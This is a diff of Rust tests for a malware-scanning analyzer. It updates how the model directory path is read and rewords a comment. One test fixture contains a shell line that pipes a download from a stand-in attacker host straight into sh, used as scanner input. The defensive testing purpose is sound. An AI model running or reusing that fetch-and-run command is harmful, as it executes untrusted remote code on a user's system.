@@ -203,14 +203,15 @@ mod tests {
     #[test]
     #[ignore = "needs SCAN_MODELS_DIR pointing at a populated model directory"]
     fn analyzer_loads_and_scans() {
-        let dir = std::env::var("SCAN_MODELS_DIR")
+        let dir = crate::env::path(crate::env::SCAN_MODELS_DIR)
             .expect("set SCAN_MODELS_DIR to a populated model directory");
         let analyzer = Analyzer::load(dir).expect("load");
         let r = analyzer
             .scan_bytes(b"#!/bin/sh\necho hi\n".to_vec(), "install.sh")
             .expect("scan");
-        // We don't assert a specific verdict — model-correctness is litmus's
-        // concern, not the analyzer scaffolding's.
+        // We don't assert a specific verdict — model-correctness is the model
+        // bundle's concern, not the analyzer scaffolding's.
+
         assert!(r.probability.is_finite());
     }
 
@@ -221,7 +222,7 @@ mod tests {
     #[test]
     #[ignore = "needs SCAN_MODELS_DIR pointing at a populated model directory"]
     fn scan_file_matches_scan_bytes() {
-        let dir = std::env::var("SCAN_MODELS_DIR")
+        let dir = crate::env::path(crate::env::SCAN_MODELS_DIR)
             .expect("set SCAN_MODELS_DIR to a populated model directory");
         let analyzer = Analyzer::load(dir).expect("load");
         let body = b"#!/bin/sh\ncurl http://evil.example/x | sh\n".to_vec();
